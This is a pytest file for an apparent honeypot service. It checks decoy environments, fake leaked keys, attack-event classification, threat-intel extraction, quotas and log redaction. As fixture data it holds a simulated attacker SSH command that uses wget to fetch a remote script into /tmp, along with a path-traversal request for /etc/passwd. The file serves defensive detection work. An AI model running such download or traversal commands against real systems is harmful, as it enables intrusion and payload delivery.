import json, os, time, yaml
from fastapi.testclient import TestClient
from app import control, db, decoy, intel, provision, log
from app.main import app

def ev(**k): return {**dict(ts=time.time(), session="aaaaaaaaaaaa", ip="203.0.113.5", method="GET", path="/x", ua="u", body="", label="reconnaissance", env=""), **k}

def test_environments_lifecycle_and_per_env_decoy(monkeypatch):
    ctl, dec = TestClient(control.app), TestClient(decoy.app)
    assert ctl.post("/admin/company", params={"name": "Acme Pay"}).json()["environment"] == "acme-pay"
    ctl.post("/admin/environments", params={"name": "Beta Corp", "industry": "Health", "size": 30})
    dec.get("/wiki"); envs = {e["id"]: e for e in ctl.get("/admin/environments").json()}
    assert envs["acme-pay"]["active"] and not envs["beta-corp"]["active"] and envs["acme-pay"]["event_count"] == 1
    assert "Acme Pay" in dec.get("/wiki").json()["title"]
    assert ctl.post("/admin/environments/beta-corp/activate").status_code == 200 and "Beta Corp" in dec.get("/wiki").json()["title"]
    assert db.recent_events(1)[0]["env"] == "beta-corp"
    monkeypatch.setenv("HIAB_ENV_ID", "acme-pay"); import app.runtime as rt; rt.reset()          # a per-environment container
    assert "Acme Pay" in dec.get("/wiki").json()["title"]
    ctl.post("/admin/environments/acme-pay/status", params={"value": "stopped"}); assert dec.get("/wiki").status_code == 503
    ctl.post("/admin/environments/acme-pay/status", params={"value": "running"}); assert dec.get("/wiki").status_code == 200
    monkeypatch.delenv("HIAB_ENV_ID"); rt.reset()
    assert ctl.post("/admin/environments/beta-corp/port", params={"value": 9999}).status_code == 422
    assert ctl.post("/admin/environments/beta-corp/port", params={"value": 8101}).status_code == 200
    assert ctl.post("/admin/environments/acme-pay/port", params={"value": 8101}).status_code == 409
    assert ctl.delete("/admin/environments/beta-corp").status_code == 200 and dec.get("/wiki").status_code == 503   # active env deleted

def test_richer_decoys_and_classification():
    ctl, dec = TestClient(control.app), TestClient(decoy.app); ctl.post("/admin/company", params={"name": "Acme Pay"})
    key = dec.get("/.env").text.split("AWS_ACCESS_KEY_ID=")[1].splitlines()[0]
    assert "acme-pay-api" in [r["name"] for r in dec.get("/repos").json()]
    assert key in dec.get("/repos/acme-pay-api/blob/config.py").text                       # repos hold the company's decoy keys
    assert dec.get("/repos/acme-pay-api/blob/../../../etc/passwd").status_code == 404 and dec.get("/repos/x/blob/y").status_code == 404
    assert "Disallow: /repos/" in dec.get("/robots.txt").text and dec.get("/.git/HEAD").text.startswith("ref:")
    assert "form" in dec.get("/admin-panel").text and dec.get("/wp-login.php").status_code == 200 and dec.get("/phpmyadmin/").status_code == 200
    assert "Instances" in str(dec.get("/api/aws/instances").json()) and dec.get("/api/users").json()[0]["email"]
    got = {e["path"]: e["label"] for e in ctl.get("/admin/events?limit=100").json()}
    assert got["/repos"] == "data_discovery_attempt" and got["/.git/HEAD"] == "data_discovery_attempt" and got["/admin-panel"] == "credential_probing" and got["/robots.txt"] == "reconnaissance"

def test_intel_aggregation():
    evs = [ev(method="SSH-AUTH", path="root", body="password=123456 accepted=False", session="s1", ip="198.51.100.1"),
           ev(method="SSH-AUTH", path="root", body="password=toor accepted=True", session="s1", ip="198.51.100.1"),
           ev(method="SSH", path="wget http://203.0.113.9/x.sh -O /tmp/x; ping 8.8.8.8", label="exploitation_attempt", session="s1", ip="198.51.100.1"),
           ev(method="GET", path="/.env", label="data_discovery_attempt", session="s2", ip="192.0.2.8")]
    r = intel.build(evs)
    assert r["totals"] == {"events": 4, "sources": 2, "sessions": 2} and r["top_ips"][0]["ip"] == "198.51.100.1"
    assert {"username": "root", "password": "toor", "accepted": True, "count": 1} in r["credentials"]
    assert {"kind": "url", "value": "http://203.0.113.9/x.sh", "count": 1} in r["iocs"] and {"kind": "ip", "value": "8.8.8.8", "count": 1} in r["iocs"]
    assert next(s for s in r["sessions"] if s["session"] == "s1")["risk"] == "high" and r["paths"][0]["path"] == "/.env"
    assert any(t["tactic"].startswith("TA0001") for t in r["tactics"])

def test_settings_apply_and_quota_and_audit():
    ctl, dec = TestClient(control.app), TestClient(decoy.app); ctl.post("/admin/company", params={"name": "Acme Pay"})
    assert ctl.put("/admin/settings", json={"rate_per_min": 0}).status_code == 422 and ctl.put("/admin/settings", json={"max_events": 5}).status_code == 422
    assert ctl.put("/admin/settings", json={"rate_per_min": 2, "max_events": 1000, "retention_days": 7}).json() == {"rate_per_min": 2, "retention_days": 7, "max_events": 1000}
    for _ in range(5): dec.get("/wiki")
    assert len(db.recent_events()) == 2                                             # rate limit from the DB setting, no restart
    for i in range(1200): db.insert_event(ev(path=f"/p{i}"))
    r = ctl.post("/admin/maintenance").json(); assert r["trimmed"] == 202 and len(db.recent_events(2000)) == 1000   # disk quota keeps newest
    db.insert_event(ev(ts=time.time() - 9 * 86400)); assert ctl.post("/admin/maintenance").json()["purged"] == 1            # 7-day retention
    s = ctl.get("/admin/settings").json(); assert s["runtime"]["database"] == "sqlite" and s["settings"]["max_events"] == 1000
    assert any("setting rate_per_min=2" in a["action"] for a in ctl.get("/admin/audit").json())

def test_intel_endpoint_and_admin_auth(monkeypatch):
    monkeypatch.setenv("HIAB_ADMIN_TOKEN", "t0ken"); c = TestClient(app)
    for p in ("/admin/intel", "/admin/environments", "/admin/settings"): assert c.get(p).status_code == 401
    assert c.get("/admin/intel", headers={"x-admin-token": "t0ken"}).json()["totals"]["events"] == 0

def test_provision_renders_valid_files():
    y = yaml.safe_load(provision.render_compose("acme-pay")); s = y["services"]["decoy-acme-pay"]
    assert s["environment"]["HIAB_ENV_ID"] == "acme-pay" and s["networks"] == ["decoy", "db_ingest"] and s["read_only"] and s["cap_drop"] == ["ALL"]
    assert "HIAB_ADMIN_TOKEN" not in s["environment"] and "ANTHROPIC_API_KEY" not in s["environment"] and "ports" not in s
    n = provision.render_nginx("acme-pay", 8101); assert "listen 8101;" in n and "$up" in n and "decoy-acme-pay:8000" in n
    assert provision.slugify("  Acme Pay, Inc.! ") == "acme-pay-inc" and provision.slugify("???") == "env"

def test_logs_are_json_and_never_contain_secrets(capsys):
    import logging, asyncio
    from app import events
    seen = []; h = logging.Handler(); h.emit = lambda r: seen.append(log.JsonFormatter().format(r)); lg = logging.getLogger("hiab.events"); lg.addHandler(h)
    asyncio.run(events.emit(ev(method="SSH-AUTH", path="root", body="password=SuperSecret1 accepted=False")))
    assert seen and json.loads(seen[0])["path"] == "root" and "SuperSecret1" not in seen[0]
    lg.removeHandler(h)
